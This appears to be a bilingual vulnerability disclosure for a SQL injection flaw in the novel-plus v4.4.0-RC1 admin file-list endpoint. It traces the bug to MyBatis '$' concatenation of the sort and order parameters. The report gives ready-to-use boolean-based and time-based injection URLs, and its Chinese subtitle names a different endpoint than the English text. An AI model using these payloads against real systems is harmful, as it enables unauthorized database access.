SQL injection vulnerability exists in novel-plus v4.4.0-RC1

novel-plus系统novel-admin子系统common/log/list接口存在SQL注入

The /common/sysFile/list interface of the novel-admin subsystem in the novel-plus system has SQL injection vulnerability.

official website: https://novel.xxyopen.com/index.htm

github: https://github.com/201206030/novel-plus

Affected version: v4.4.0-RC1

releases：https://github.com/201206030/novel-plus/releases/tag/v4.4.0-RC1


Payload:
```
parameter -sort-
http://127.0.0.1:8088/common/sysFile/list?limit=10&offset=0&sort=1 AND 7858=(SELECT (CASE WHEN (7858=7858) THEN 7858 ELSE (SELECT 8757 UNION SELECT 2737) END))-- -&order=asc
http://127.0.0.1:8088/common/sysFile/list?limit=10&offset=0&sort=1 AND (SELECT 8148 FROM (SELECT(SLEEP(5)))yohp)&order=asc
parameter -order-
http://127.0.0.1:8088/common/sysFile/list?limit=10&offset=0&sort=1&order=,1 AND 4354=(SELECT (CASE WHEN (4354=4354) THEN 4354 ELSE (SELECT 8745 UNION SELECT 7606) END))-- - asc
http://127.0.0.1:8088/common/sysFile/list?limit=10&offset=0&sort=1&order=,1 AND (SELECT 2800 FROM (SELECT(SLEEP(5)))qQhq) asc
```

Use sqlmap for verification, and retrieve all the database names.

使用sqlmap验证，跑出所有库名：

parameter -sort-
![image](https://github.com/user-attachments/assets/64798adf-03a3-414d-be13-7552b604166a)

parameter -order-
![image](https://github.com/user-attachments/assets/31b7056c-c898-469d-8566-6e4259391c29)


The list interface in FileController calls the list method from FileService to query sysFile.

FileController中list接口调用FileService的list方法系统文件；

novel-admin/src/main/java/com/java2nb/common/controller/FileController.java

![image](https://github.com/user-attachments/assets/355fa270-78b1-497c-a17c-947d1623737d)

FileServiceImpl calls sysFileMapper to query the file.

FileServiceImpl中调用sysFileMapper查询文件；

novel-admin/src/main/java/com/java2nb/common/service/impl/FileServiceImpl.java

![image](https://github.com/user-attachments/assets/75ae0ce3-809f-4e55-88d5-d3b5fb7a2690)


In sysFileMapper, the usage of the $ symbol to concatenate the sort parameter and the order parameter results in an SQL injection vulnerability.

sysFileMapper中sort参数和order参数使用了$符号来拼接，导致存在SQL注入漏洞；

novel-admin/src/main/resources/mybatis/common/FileMapper.xml

![image](https://github.com/user-attachments/assets/5071c951-a2ab-4c99-9b18-1f52521a2434)










